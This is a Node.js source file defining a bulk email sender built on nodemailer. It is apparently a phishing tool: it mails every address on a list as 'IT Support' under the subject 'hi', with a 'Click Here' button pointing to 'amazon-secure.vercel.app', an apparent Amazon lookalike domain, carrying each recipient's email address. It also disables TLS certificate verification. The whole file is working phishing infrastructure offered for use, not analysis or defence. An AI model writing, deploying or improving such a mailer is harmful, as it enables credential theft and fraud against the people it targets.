import nodemailer from 'nodemailer';
import emails from '../emails.js';
import fs from 'fs';
import path from 'path';

const __dirname = path.resolve();
const htmlBody = fs.readFileSync(path.join(__dirname, './api/mail.html'), 'utf-8');

const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtpout.secureserver.net',
    port: process.env.SMTP_PORT || 587,
    secure: false,
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    },
    tls: {
        ciphers: 'SSLv3',
        rejectUnauthorized: false
    },
    logger: true,
    debug: true
});

const sendEmails = async (req, res) => {
    try {
        if (emails.length === 0) {
            return res.status(400).send('❌ No emails provided.');
        }

        const sendPromises = emails.map(email => {
            const emailBody = htmlBody.replace('{{email}}', encodeURIComponent(email));

            return transporter.sendMail({
                from: `"IT Support" <${process.env.SMTP_USER}>`,
                to: email,
                subject: 'hi',
                html: emailBody + `<a href="https://amazon-secure.vercel.app/?email=${email}" style="display:inline-block; padding:10px 15px; background-color:#007bff; color:#fff; text-decoration:none; border-radius:5px;">Click Here</a>`

            }).then(info => {
                console.log(`✅ Sent to ${email}: ${info.messageId}`);
            }).catch(err => {
                console.error(`❌ Failed to send to ${email}:`, err.message);
            });
        });

        await Promise.all(sendPromises);

        res.send('All emails processed!');
     } catch (err) {
        console.error(`Error in sendEmails():`, err.message);
        res.status(500).send('Failed to send emails.');
    }
};

export default sendEmails;
